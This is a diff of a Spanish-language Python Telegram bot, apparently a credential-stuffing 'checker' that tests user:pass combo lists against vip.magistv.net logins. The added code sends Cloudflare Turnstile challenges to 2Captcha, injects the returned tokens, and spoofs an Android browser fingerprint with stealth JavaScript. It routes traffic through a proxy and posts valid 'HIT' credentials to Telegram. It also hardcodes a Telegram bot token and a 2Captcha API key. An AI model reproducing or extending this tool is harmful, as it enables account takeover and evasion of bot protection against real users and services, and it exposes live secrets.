@@ -2,7 +2,8 @@
 # -*- coding: utf-8 -*-
 """
 ╔══════════════════════════════════════════════════════════════╗
-║   🎬 Flujo TV — Último intento CF (frame_locator + force)   ║
+║   🎬 Flujo TV — 2Captcha Turnstile + Xvfb                 ║
+║   Resuelve CF externamente vía API, inyecta token           ║
 ╚══════════════════════════════════════════════════════════════╝
 """
 
@@ -19,6 +20,8 @@ PROXY = {
 ROTATE_EVERY = 10
 TG_TOKEN = "8594813440:AAFFKfWwup01Si1C-exXIN2InTABuKgRv7g"
 ADMIN_IDS = []
+CAPTCHA_KEY = "0c562cdeb4a07e0f2138f398c215fa9e"
+
 BOT_DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_data")
 os.makedirs(BOT_DATA_DIR, exist_ok=True)
 STOP_FILE = "/tmp/flujo_bot_stop"
@@ -31,9 +34,215 @@ bot_state = {"running": False, "current_chat": None, "_start_time": None, "_proc
 def get_proxy_conf():
     return {"server": f"http://{PROXY['host']}:{PROXY['port']}", "username": PROXY["user"], "password": PROXY["pass"]}
 
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
+#  2CAPTCHA API (urllib — sin dependencia extra)
+# ════════════════════════════════════════════════════════════════════════
+
+def captcha_balance():
+    try:
+        url = f"http://2captcha.com/res.php?key={CAPTCHA_KEY}&action=getbalance&json=1"
+        with urllib.request.urlopen(url, timeout=10) as r: return float(r.read().decode())
+    except: return -1
+
+def captcha_send_turnstile(sitekey, pageurl):
+    """Envía Turnstile a 2Captcha, devuelve task_id"""
+    data = urllib.parse.urlencode({
+        'key': CAPTCHA_KEY, 'method': 'turnstile',
+        'sitekey': sitekey, 'pageurl': pageurl, 'json': 1
+    }).encode()
+    req = urllib.request.Request('http://2captcha.com/in.php', data=data)
+    with urllib.request.urlopen(req, timeout=15) as r:
+        resp = json.loads(r.read())
+    if resp.get('status') == 1: return resp['request']
+    raise Exception(f"2Captcha send: {resp.get('request', '?')}")
+
+def captcha_poll(task_id, timeout=120):
+    """Espera resultado, devuelve token"""
+    start = time.time()
+    while time.time() - start < timeout:
+        time.sleep(4)
+        url = f"http://2captcha.com/res.php?key={CAPTCHA_KEY}&action=get&id={task_id}&json=1"
+        with urllib.request.urlopen(url, timeout=15) as r:
+            resp = json.loads(r.read())
+        if resp.get('status') == 1: return resp['request']
+        if resp.get('request') != 'CAPCHA_NOT_READY':
+            raise Exception(f"2Captcha poll: {resp.get('request')}")
+    raise Exception("2Captcha timeout")
+
+def extract_sitekey(page):
+    """Extrae sitekey de Turnstile del HTML"""
+    try:
+        sk = page.evaluate("""() => {
+            const el = document.querySelector('[data-sitekey]');
+            return el ? el.getAttribute('data-sitekey') : null;
+        }""")
+        if sk: return sk
+    except: pass
+    try:
+        content = page.content()
+        m = re.search(r'data-sitekey=["\']([^"\']+)["\']', content)
+        if m: return m.group(1)
+        m = re.search(r"sitekey:\s*['\"]([^'\"]+)['\"]", content)
+        if m: return m.group(1)
+        m = re.search(r'sitekey=([^&"\']+)', content)
+        if m: return m.group(1)
+    except: pass
+    return None
+
+def inject_turnstile_token(page, token):
+    """Inyecta token de 2Captcha en la página"""
+    return page.evaluate("""(token) => {
+        // 1. turnstile.setResponse (método oficial)
+        if (window.turnstile) {
+            try {
+                if (typeof window.turnstile.setResponse === 'function') {
+                    window.turnstile.setResponse(token);
+                    return 'setResponse';
+                }
+            } catch(e) {}
+        }
+
+        // 2. Set textarea + dispatch events
+        const ta = document.querySelector('textarea[name="cf-turnstile-response"]');
+        const inp = document.querySelector('input[name="cf-turnstile-response"]');
+        const el = ta || inp;
+        if (el) {
+            const proto = el.tagName === 'TEXTAREA' ? HTMLTextAreaElement : HTMLInputElement;
+            const setter = Object.getOwnPropertyDescriptor(proto.prototype, 'value').set;
+            setter.call(el, token);
+            el.dispatchEvent(new Event('input', {bubbles: true}));
+            el.dispatchEvent(new Event('change', {bubbles: true}));
+        }
+
+        // 3. Disparar data-callback
+        const containers = document.querySelectorAll('[data-sitekey], .cf-turnstile');
+        for (const c of containers) {
+            const cb = c.getAttribute('data-callback');
+            if (cb) {
+                try {
+                    if (typeof window[cb] === 'function') { window[cb](token); return 'callback'; }
+                } catch(e) {}
+                try {
+                    const fn = new Function('t', cb);
+                    fn(token); return 'callback_eval';
+                } catch(e) {}
+            }
+        }
+
+        // 4. Buscar y ejecutar cualquier función que suene a callback
+        for (const key of Object.keys(window)) {
+            if (typeof window[key] === 'function' && 
+                (key.includes('turnstile') || key.includes('cfCallback') || key.includes('captchaSuccess'))) {
+                try { window[key](token); return 'fn_' + key; } catch(e) {}
+            }
+        }
+
+        // 5. Submit form si existe
+        const form = document.getElementById('challenge-form') || document.querySelector('form[action*="chk"]');
+        if (form && el && el.value === token) {
+            try { 
+                const btn = form.querySelector('button[type="submit"], input[type="submit"]');
+                if (btn) btn.click();
+                else form.submit();
+                return 'submit';
+            } catch(e) {}
+        }
+
+        return !!el ? 'set_value' : 'none';
+    }""", token)
+
+def solve_cf_2captcha(page, chat_id=None):
+    """Resuelve CF Turnstile vía 2Captcha — retorna True si OK"""
+    # Esperar que aparezca Turnstile
+    sitekey = None
+    for _ in range(15):
+        page.wait_for_timeout(1000)
+        sitekey = extract_sitekey(page)
+        if sitekey: break
+        if _has_login(page): return True
+
+    if not sitekey:
+        print("  [!] No se encontró sitekey — fallback a click")
+        return solve_turnstile_click(page)
+
+    print(f"  [🔑] Sitekey: {sitekey[:20]}...")
+    if chat_id:
+        tg_send_msg(chat_id, f"🔑 Sitekey encontrado\n⏳ Enviando a 2Captcha (~20s)...", disable_notification=True)
+
+    try:
+        task_id = captcha_send_turnstile(sitekey, "https://vip.magistv.net/mobile/login")
+        print(f"  [🔑] Task: {task_id} — esperando token...")
+        token = captcha_poll(task_id, timeout=90)
+        print(f"  [✅] Token: {token[:30]}...")
+
+        if chat_id:
+            tg_send_msg(chat_id, f"✅ Token recibido — inyectando...", disable_notification=True)
+
+        method = inject_turnstile_token(page, token)
+        print(f"  [💉] Inyección: {method}")
+
+        # Esperar que la página reaccione
+        for _ in range(15):
+            page.wait_for_timeout(1000)
+            if _has_login(page):
+                print("  [✅] 2Captcha SUCCESS!")
+                return True
+
+        # Si no funcionó, intentar click como último recurso
+        print("  [!] Token inyectado pero no pasó — intentando click...")
+        time.sleep(2)
+        return solve_turnstile_click(page)
+
+    except Exception as e:
+        print(f"  [!] 2Captcha error: {e}")
+        if chat_id:
+            tg_send_msg(chat_id, f"⚠️ 2Captcha: <code>{esc(str(e)[:100])}</code>\nFallback a click...", disable_notification=True)
+        return solve_turnstile_click(page)
+
+# ════════════════════════════════════════════════════════════════════════
+#  TURNSTILE CLICK (FALLBACK)
+# ════════════════════════════════════════════════════════════════════════
+
+def solve_turnstile_click(page, max_a=6):
+    for att in range(1, max_a + 1):
+        try:
+            cf_loc = page.frame_locator('iframe[src*="challenges.cloudflare.com"]')
+            for sel in ["input[type='checkbox']", "label", "body"]:
+                try:
+                    el = cf_loc.locator(sel).first
+                    if el.is_visible(timeout=500):
+                        el.click(force=True, timeout=2000)
+                        page.wait_for_timeout(5000)
+                        if _has_login(page): return True
+                except: continue
+        except: pass
+        try:
+            for frame in page.frames:
+                if "challenges.cloudflare.com" in (frame.url or ""):
+                    for sel in ["input[type='checkbox']", "label", ".mark", "body"]:
+                        try:
+                            el = frame.locator(sel).first
+                            if el.is_visible(timeout=500):
+                                el.click(force=True, timeout=2000)
+                                page.wait_for_timeout(5000)
+                                if _has_login(page): return True
+                        except: continue
+        except: pass
+        try:
+            for ifr in page.locator("iframe").all():
+                if "challenges.cloudflare.com" in (ifr.get_attribute("src") or ""):
+                    box = ifr.bounding_box()
+                    if box and box["width"] > 0:
+                        page.tap(box["x"]+28, box["y"]+box["height"]/2)
+                        page.wait_for_timeout(5000)
+                        if _has_login(page): return True
+        except: pass
+        page.wait_for_timeout(2000)
+    return False
+
+# ════════════════════════════════════════════════════════════════════════
 #  TELEGRAM API
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 
 def tg_api(method, params=None, files=None, timeout=30):
     url = f"https://api.telegram.org/bot{TG_TOKEN}/{method}"
@@ -105,15 +314,15 @@ def kb_main():
 def kb_cancel():
     return {"inline_keyboard": [[{"text": "⏹ Cancelar", "callback_data": "cancel_check"}]]}
 
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 #  DEPS
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 
 def run_cmd(cmd, timeout=300):
     try:
         p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
         out = [l.rstrip() for l in p.stdout if l.rstrip()]; p.wait(timeout=timeout); return p.returncode == 0, "\n".join(out)
-    except: return False, str(e)
+    except Exception as e: return False, str(e)
 
 def pip_install(pkg):
     for c in [[sys.executable,"-m","pip","install","-q",pkg],[sys.executable,"-m","pip","install","-q","--user",pkg],[sys.executable,"-m","pip","install","-q","--break-system-packages",pkg]]:
@@ -167,37 +376,31 @@ def get_captcha_img(page):
     except: pass
     return None
 
-# ══════════════════════════════════════════════════════════════════[...]
-#  STEALTH JS — ANDROID COMPLETO
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
+#  STEALTH JS
+# ════════════════════════════════════════════════════════════════════════
 
 STEALTH_JS = """
-Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
-delete navigator.__proto__.webdriver;
-Object.defineProperty(navigator,'platform',{get:()=>'Linux armv81'});
-Object.defineProperty(navigator,'userAgentData',{get:()=>undefined});
-Object.defineProperty(navigator,'vendor',{get:()=>'Google Inc.'});
-Object.defineProperty(navigator,'maxTouchPoints',{get:()=>5});
-Object.defineProperty(navigator,'hardwareConcurrency',{get:()=>8});
-Object.defineProperty(navigator,'deviceMemory',{get:()=>4});
-Object.defineProperty(navigator,'languages',{get:()=>['es-ES','es','en-US','en']});
-Object.defineProperty(navigator,'language',{get:()=>'es-ES'});
+Object.defineProperty(navigator,'webdriver',{get:()=>undefined});delete navigator.__proto__.webdriver;
+Object.defineProperty(navigator,'platform',{get:()=>'Linux armv81'});Object.defineProperty(navigator,'userAgentData',{get:()=>undefined});
+Object.defineProperty(navigator,'vendor',{get:()=>'Google Inc.'});Object.defineProperty(navigator,'maxTouchPoints',{get:()=>5});
+Object.defineProperty(navigator,'hardwareConcurrency',{get:()=>8});Object.defineProperty(navigator,'deviceMemory',{get:()=>4});
+Object.defineProperty(navigator,'languages',{get:()=>['es-ES','es','en-US','en']});Object.defineProperty(navigator,'language',{get:()=>'es-ES'});
 window.chrome={runtime:{},loadTimes:function(){},csi:function(){},app:{}};
-Object.defineProperty(navigator,'plugins',{get:()=>{const p=[{name:'Chrome PDF Plugin',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1},{name:'Chrome PDF Viewer',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1}];return p;}});
-Object.defineProperty(navigator,'mimeTypes',{get:()=>{const m=[{type:'application/pdf',suffixes:'pdf',description:'Portable Document Format'},{type:'application/x-nacl',suffixes:'',description:'Native Client Executable'},{type:'application/x-pnacl',suffixes:'pnacl',description:'Portable Native Client Executable'}];return m;}});
+Object.defineProperty(navigator,'plugins',{get:()=>{const p=[{name:'Chrome PDF Plugin',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1},{name:'Chrome PDF Viewer',filename:'mhjfbmdgcfjbbpaeojofohoefgiehjai',description:'',length:1},{name:'Native Client',filename:'internal-nacl-plugin',description:'',length:2}];p.refresh=function(){};return p}});
+Object.defineProperty(navigator,'mimeTypes',{get:()=>{const m=[{type:'application/pdf',suffixes:'pdf'},{type:'application/x-nacl',suffixes:''},{type:'application/x-pnacl',suffixes:''}];m.refresh=function(){};return m}});
 const oq=window.navigator.permissions.query;window.navigator.permissions.query=(p)=>p.name==='notifications'?Promise.resolve({state:Notification.permission}):oq(p);
-const gp=WebGLRenderingContext.prototype.getParameter;WebGLRenderingContext.prototype.getParameter=function(p){if(p===37445)return'Qualcomm';if(p===37446)return'Adreno (TM) 640';if(p===7936)return'WebGL';return gp.apply(this,[p]);};
-Object.defineProperty(navigator,'connection',{get:()=>({effectiveType:'4g',rtt:50,downlink:10,saveData:false,type:'cellular',ontypechange:null,onchange:null,addEventListener:function(){},removeEventListener:function(){}})});
-Object.defineProperty(screen,'width',{get:()=>412});Object.defineProperty(screen,'height',{get:()=>915});Object.defineProperty(screen,'availWidth',{get:()=>412});Object.defineProperty(screen,'availHeight',{get:()=>915});
+const gp=WebGLRenderingContext.prototype.getParameter;WebGLRenderingContext.prototype.getParameter=function(p){if(p===37445)return'Qualcomm';if(p===37446)return'Adreno (TM) 640';if(p===7936)return['WebGL 1.0 (OpenGL ES 2.0 Chromium)'];return gp.call(this,p)};
+Object.defineProperty(navigator,'connection',{get:()=>({effectiveType:'4g',rtt:50,downlink:10,saveData:false,type:'cellular',ontypechange:null,onchange:null,addEventListener:function(){},removeEventListener:function(){},dispatchEvent:function(){return true}})});
+Object.defineProperty(screen,'width',{get:()=>412});Object.defineProperty(screen,'height',{get:()=>915});Object.defineProperty(screen,'availWidth',{get:()=>412});Object.defineProperty(screen,'availHeight',{get:()=>872});Object.defineProperty(screen,'colorDepth',{get:()=>24});
 Object.defineProperty(window,'devicePixelRatio',{get:()=>2.625});Object.defineProperty(window,'innerWidth',{get:()=>412});Object.defineProperty(window,'innerHeight',{get:()=>872});
-window._mx=200;window._my=400;document.addEventListener('mousemove',e=>{window._mx=e.clientX;window._my=e.clientY});document.addEventListener('touchmove',e=>{if(e.touches[0]){window._mx=e.touches[0].clientX;window._my=e.touches[0].clientY}});
-try{const ed=Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype,'contentWindow');Object.defineProperty(HTMLIFrameElement.prototype,'contentWindow',{get:function(){try{return ed.get.call(this);}catch(e){return undefined;}}});}catch(e){}
-Object.defineProperty(Notification,'permission',{get:()=>'default'});
+window._mx=200;window._my=400;document.addEventListener('mousemove',e=>{window._mx=e.clientX;window._my=e.clientY});
+try{const ed=Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype,'contentWindow');Object.defineProperty(HTMLIFrameElement.prototype,'contentWindow',{get:function(){try{return ed.get.call(this)}catch(e){return null}}})}catch(e){}
 """
 
-# ══════════════════════════════════════════════════════════════════[...]
-#  CLOUDFLARE — MÉTODOS MÚLTIPLES
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
+#  CF HANDLER (2CAPTCHA PRIMERO, CLICK FALLBACK)
+# ════════════════════════════════════════════════════════════════════════
 
 def _has_login(page):
     try:
@@ -212,128 +415,28 @@ def _has_login(page):
     except: pass
     return False
 
-def solve_turnstile(page, max_a=12):
-    """Intenta TODOS los métodos posibles para resolver Turnstile"""
-    for att in range(1, max_a + 1):
-        print(f"  [🛡️] Turnstile intento {att}/{max_a}")
-
-        # ── MÉTODO 1: frame_locator (recomendado por Playwright) ──
-        try:
-            cf_loc = page.frame_locator('iframe[src*="challenges.cloudflare.com"]')
-            for sel in ["input[type='checkbox']", "label", "#challenge-stage", "body"]:
-                try:
-                    el = cf_loc.locator(sel).first
-                    if el.is_visible(timeout=800):
-                        el.click(force=True, timeout=2000)
-                        page.wait_for_timeout(6000)
-                        if _has_login(page):
-                            print("  [✅] Turnstile OK (frame_locator)")
-                            return True
-                except: continue
-        except: pass
-
-        # ── MÉTODO 2: frame.locator directamente ──
-        try:
-            for frame in page.frames:
-                if "challenges.cloudflare.com" in (frame.url or ""):
-                    for sel in ["input[type='checkbox']", "label", ".mark", ".cb-lb", "body"]:
-                        try:
-                            el = frame.locator(sel).first
-                            if el.is_visible(timeout=500):
-                                el.click(force=True, timeout=2000)
-                                page.wait_for_timeout(6000)
-                                if _has_login(page):
-                                    print("  [✅] Turnstile OK (frame.locator)")
-                                    return True
-                        except: continue
-        except: pass
-
-        # ── MÉTODO 3: Coordenadas del iframe + tap ──
-        try:
-            for ifr in page.locator("iframe").all():
-                src = ifr.get_attribute("src") or ""
-                if "challenges.cloudflare.com" in src:
-                    box = ifr.bounding_box()
-                    if box and box["width"] > 0:
-                        # Scroll al iframe
-                        page.evaluate(f"window.scrollTo(0, {max(0, box['y']-100)})")
-                        page.wait_for_timeout(300)
-                        # Tap en el checkbox (aprox x=28, y=mitad)
-                        tx = box["x"] + 28
-                        ty = box["y"] + box["height"] / 2
-                        page.touch.move(tx + random.randint(-5, 5), ty + random.randint(-5, 5))
-                        time.sleep(random.uniform(0.3, 0.8))
-                        page.tap(tx, ty)
-                        page.wait_for_timeout(6000)
-                        if _has_login(page):
-                            print("  [✅] Turnstile OK (tap coords)")
-                            return True
-        except: pass
-
-        # ── MÉTODO 4: Clic con mouse en coordenadas ──
-        try:
-            for ifr in page.locator("iframe").all():
-                src = ifr.get_attribute("src") or ""
-                if "challenges.cloudflare.com" in src:
-                    box = ifr.bounding_box()
-                    if box and box["width"] > 0:
-                        mx = box["x"] + 28
-                        my = box["y"] + box["height"] / 2
-                        page.mouse.move(mx + random.randint(30, 80), my + random.randint(-30, 30))
-                        time.sleep(random.uniform(0.3, 0.6))
-                        page.mouse.click(mx, my)
-                        page.wait_for_timeout(6000)
-                        if _has_login(page):
-                            print("  [✅] Turnstile OK (mouse click)")
-                            return True
-        except: pass
-
-        # ── MÉTODO 5: DispatchEvent click en el frame ──
-        try:
-            for frame in page.frames:
-                if "challenges.cloudflare.com" in (frame.url or ""):
-                    try:
-                        frame.evaluate("""() => {
-                            const cb = document.querySelector('input[type="checkbox"]');
-                            if(cb){ cb.click(); cb.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true})); }
-                            const lb = document.querySelector('label');
-                            if(lb){ lb.click(); lb.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true})); }
-                        }""")
-                        page.wait_for_timeout(6000)
-                        if _has_login(page):
-                            print("  [✅] Turnstile OK (dispatchEvent)")
-                            return True
-                    except: pass
-        except: pass
-
-        page.wait_for_timeout(2000)
-
-    return False
-
 def handle_cf(page, chat_id=None):
-    # Esperar a que cargue
-    for _ in range(30):
+    """Intenta resolver CF: 2Captcha primero, click como fallback"""
+    # Esperar a que cargue algo
+    for _ in range(5):
         page.wait_for_timeout(1000)
         if _has_login(page): return True
-        # Verificar si Turnstile apareció
-        try:
-            for f in page.locator("iframe").all():
-                if "challenges.cloudflare.com" in (f.get_attribute("src") or ""):
-                    # Turnstile detectado, intentar resolver
-                    if solve_turnstile(page):
-                        return True
-                    # Si no resolvió, seguir esperando
-                    break
-        except: pass
-    # Última espera
-    for _ in range(10):
+
+    # PRIMERO: 2Captcha
+    print("  [🛡️] Intentando 2Captcha Turnstile...")
+    if solve_cf_2captcha(page, chat_id):
+        return True
+
+    # FALLBACK: clicks
+    print("  [🛡️] 2Captcha falló — intentando clicks...")
+    for _ in range(20):
         page.wait_for_timeout(1000)
         if _has_login(page): return True
     return False
 
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 #  HELPERS
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 
 def clear_auth(ctx):
     try:
@@ -403,13 +506,13 @@ def update_progress(chat_id, msg_id, acc, res, st):
             reply_markup=kb_cancel())
     except: pass
 
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 #  DIAGNÓSTICO
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 
 def test_cf(chat_id):
     from playwright.sync_api import sync_playwright
-    tg_send_msg(chat_id, "🔬 Diagnosticando... (60s)")
+    tg_send_msg(chat_id, "🔬 Diagnosticando con 2Captcha... (60s)")
     try:
         with sync_playwright() as p:
             browser = p.chromium.launch(headless=False, args=["--no-sandbox","--disable-blink-features=AutomationControlled"])
@@ -418,7 +521,7 @@ def test_cf(chat_id):
                 viewport={"width":412,"height":915}, is_mobile=True, has_touch=True,
                 screen={"width":412,"height":915}, device_scale_factor=2.625,
                 proxy=get_proxy_conf(),
-                extra_http_headers={"Accept-Language":"es-ES,es;q=0.9","Sec-CH-UA-Platform":'"Android"',"Sec-CH-UA-Mobile":"?1","Sec-CH-UA":'"Not A(Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"'}
+                extra_http_headers={"Accept-Language":"es-ES,es;q=0.9","Sec-CH-UA-Platform":'"Android"',"Sec-CH-UA-Mobile":"?1"},
             )
             ctx.add_init_script(STEALTH_JS)
             page = ctx.new_page()
@@ -427,44 +530,68 @@ def test_cf(chat_id):
             try: page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=45000)
             except Exception as e: error = str(e)[:150]
 
-            # Esperar hasta 60 segundos
-            ok = False
-            for sec in range(60):
+            # Balance
+            bal = captcha_balance()
+            tg_send_msg(chat_id, f"💰 Saldo 2Captcha: ${bal:.4f}", disable_notification=True)
+
+            # Buscar sitekey
+            sitekey = None
+            for _ in range(15):
                 page.wait_for_timeout(1000)
-                if _has_login(page): ok = True; break
-                # Cada 10s mandar screenshot intermedio
-                if sec in [9, 19, 29, 39, 49]:
-                    try:
-                        path = os.path.join(SCREENSHOT_DIR, f"diag_{sec}s.png")
-                        page.screenshot(path=path)
-                        with open(path, "rb") as f: img = f.read()
-                        tg_send_photo(chat_id, img, f"⏱ {sec+1}s — {esc(page.title() or '?')}", disable_notification=True)
-                        os.remove(path)
-                    except: pass
+                sitekey = extract_sitekey(page)
+                if sitekey: break
+                if _has_login(page):
+                    tg_send_msg(chat_id, "🟢 <b>Sin CF — login directo</b>")
+                    browser.close(); return
 
-            path = os.path.join(SCREENSHOT_DIR, "diag_final.png")
-            page.screenshot(path=path)
-            with open(path, "rb") as f: img = f.read()
-            os.remove(path)
+            if not sitekey:
+                tg_send_msg(chat_id, "🔴 <b>No se encontró sitekey</b>\nTurnstile no está en el HTML.")
+                send_screenshot(page, chat_id, "no_sitekey")
+                browser.close(); return
 
-            title = page.title() or "?"
-            if ok: r = "🟢 <b>CF RESUELTO — LOGIN VISIBLE</b>\nEl bot debería funcionar."
-            elif "incompatible" in title.lower(): r = "🔴 <b>INCOMPATIBLE — Proxy no soporta Turnstile</b>\nNecesitas cambiar de proxy."
-            elif "un momento" in title.lower(): r = "🔴 <b>TURNSTILE NO PASA</b>\nEl click no llega o el proxy bloquea Turnstile.\n<b>Solución: cambiar de proxy a uno que soporte Cloudflare Turnstile</b>"
-            else: r = f"🟡 Resultado incierto. Title: {title}"
+            tg_send_msg(chat_id, f"🔑 Sitekey: <code>{sitekey}</code>\n⏳ Enviando a 2Captcha...", disable_notification=True)
 
-            tg_send_photo(chat_id, img, f"{r}\n\n⏱ {min(60, sec+1)}s\n📄 {esc(title)}\n❌ {esc(error)}")
+            try:
+                task_id = captcha_send_turnstile(sitekey, "https://vip.magistv.net/mobile/login")
+                tg_send_msg(chat_id, f"📋 Task: <code>{task_id}</code> — esperando...", disable_notification=True)
+                token = captcha_poll(task_id, timeout=90)
+                tg_send_msg(chat_id, f"✅ Token OK: <code>{token[:40]}...</code>\n💉 Inyectando...", disable_notification=True)
+
+                method = inject_turnstile_token(page, token)
+                tg_send_msg(chat_id, f"💉 Método: <code>{method}</code>", disable_notification=True)
+
+                # Esperar resultado
+                ok = False
+                for sec in range(20):
+                    page.wait_for_timeout(1000)
+                    if _has_login(page): ok = True; break
+                    if sec in [4, 9, 14]:
+                        send_screenshot(page, chat_id, f"post_inject_{sec}s")
+
+                path = os.path.join(SCREENSHOT_DIR, "diag_final.png")
+                page.screenshot(path=path)
+                with open(path, "rb") as f: img = f.read()
+                os.remove(path)
+
+                if ok:
+                    tg_send_photo(chat_id, img, f"🟢 <b>2CAPTCHA FUNCIONA</b>\nTurnstile resuelto e inyectado correctamente.\n\n<b>El bot debería funcionar ahora.</b>")
+                else:
+                    tg_send_photo(chat_id, img, f"🔴 <b>Token inyectado pero no pasó</b>\nMétodo: {method}\nTitle: {esc(page.title() or '?')}")
+            except Exception as e:
+                send_screenshot(page, chat_id, "error")
+                tg_send_msg(chat_id, f"❌ 2Captcha: <code>{esc(str(e)[:200])}</code>")
+
             browser.close()
     except Exception as e:
         tg_send_msg(chat_id, f"❌ <code>{esc(str(e)[:200])}</code>")
 
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 #  MOTOR
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 
 def run_checker(accounts, chat_id, msg_id, use_proxy):
     from playwright.sync_api import sync_playwright
-    hits, hits_lines, errors = [], [], {}
+    hits, hits_lines, errors = [], [], []
     processed = fails = 0
     start_time = time.time()
     bot_state["debug_sent"] = 0
@@ -473,7 +600,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
     UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
 
     with sync_playwright() as p:
-        browser = p.chromium.launch(headless=False, args=["--disable-blink-features=AutomationControlled","--no-sandbox","--disable-dev-shm-usage","--disable-infobars","--window-size=412,915","--no-first-run"])
+        browser = p.chromium.launch(headless=False, args=["--disable-blink-features=AutomationControlled","--no-sandbox","--disable-dev-shm-usage","--disable-infobars","--window-size=412,915","--no-first-run","--no-default-browser-check"])
         idx = batch_num = 0
         cf_fails = 0
 
@@ -490,7 +617,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
             ctx_kw = {
                 "user_agent": UA, "viewport": {"width":412,"height":915}, "is_mobile": True, "has_touch": True,
                 "screen": {"width":412,"height":915}, "device_scale_factor": 2.625,
-                "extra_http_headers": {"Accept-Language":"es-ES,es;q=0.9","Sec-CH-UA-Platform":'"Android"',"Sec-CH-UA-Mobile":"?1","Sec-CH-UA":'"Not A(Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"'}
+                "extra_http_headers": {"Accept-Language":"es-ES,es;q=0.9","Sec-CH-UA-Platform":'"Android"',"Sec-CH-UA-Mobile":"?1","Sec-CH-UA":'"Not A(Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"'},
             }
             if use_proxy: ctx_kw["proxy"] = get_proxy_conf()
 
@@ -680,7 +807,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                     rev="✅" if info.get("is_revendedor") else "❌";sup="✅" if info.get("is_super") else "❌"
                     hits.append({"username":user,"password":pwd,"info":info,"dashboard":dash,"token":state.get("token")})
                     hits_lines.append(f"{user}:{pwd}");stats["hits"]+=1
-                    detail=f"💰 <b>HIT #{len(hits)}</b>\n👤 <code>{user}:{pwd}</code>\n📝 {info.get('name','—')}\n🆔 {info.get('id','—')}\n🏪 Rev:{rev} 👑 Sup:{sup}\n📦 TV:{dash.get('tv',0)}"
+                    detail=f"💰 <b>HIT #{len(hits)}</b>\n👤 <code>{user}:{pwd}</code>\n📝 {info.get('name','—')}\n🆔 {info.get('id','—')}\n🏪 Rev:{rev} 👑 Sup:{sup}\n📦 T:{dash.get('sumNum',0)} A:{dash.get('activeNum',0)}"
                     update_progress(chat_id,msg_id,user,f"💰 HIT! Rev={rev}",stats)
                     try:tg_send_msg(chat_id,detail,disable_notification=True)
                     except:pass
@@ -701,9 +828,9 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
         except:pass
     return hits,hits_lines
 
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 #  START CHECK
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 
 waiting_combo = set()
 
@@ -727,18 +854,15 @@ def start_check(accounts, chat_id, use_proxy=True):
             if pmid:tg_edit_msg(chat_id,pmid,s,reply_markup=kb_main())
             else:tg_send_msg(chat_id,s,reply_markup=kb_main())
         except Exception as e:
-            print(f"  [✗] {e}")
-            try:
-                tg_send_msg(chat_id,f"❌ <code>{esc(str(e)[:200])}</code>",reply_markup=kb_main())
-            except:
-                pass
+            print(f"  [✗] {e}");try:tg_send_msg(chat_id,f"❌ <code>{esc(str(e)[:200])}</code>",reply_markup=kb_main())
+            except:pass
 
     pr=multiprocessing.Process(target=worker,args=(accounts,chat_id,pmid,use_proxy),daemon=True)
     pr.start();bot_state["_process"]=pr
 
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 #  UPDATES
-# ══════════════════════════════════════════════════════════════════[...]
+# ════════════════════════════════════════════════════════════════════════
 
 def process_update(upd):
     global ADMIN_IDS
@@ -762,7 +886,10 @@ def process_update(upd):
                 else:tg_send_msg(cid,"❌ <code>user:pass</code>",reply_markup=kb_main())
                 return
             else:waiting_combo.add(cid);tg_send_msg(cid,"📤 Envía combo",reply_markup=kb_cancel());return
-        if txt=="/start":tg_send_msg(cid,"🎬 <b>Flujo TV Bot</b>",reply_markup=kb_main())
+        if txt=="/start":tg_send_msg(cid,"🎬 <b>Flujo TV</b> + 2Captcha\n💰 Saldo: checking...",reply_markup=kb_main())
+        elif txt=="/balance":
+            b=captcha_balance()
+            tg_send_msg(cid,f"💰 2Captcha: <code>${b:.4f}</code>",reply_markup=kb_main())
         elif txt=="/check":
             if bot_state["running"]:tg_send_msg(cid,"⏳",reply_markup=kb_main())
             else:waiting_combo.add(cid);bot_state["force_no_proxy"]=False;tg_send_msg(cid,"📤 Combo (PROXY):",reply_markup=kb_cancel())
@@ -794,25 +921,31 @@ def process_update(upd):
             else:tg_answer_cb(cbq["id"],"Nada",show_alert=True)
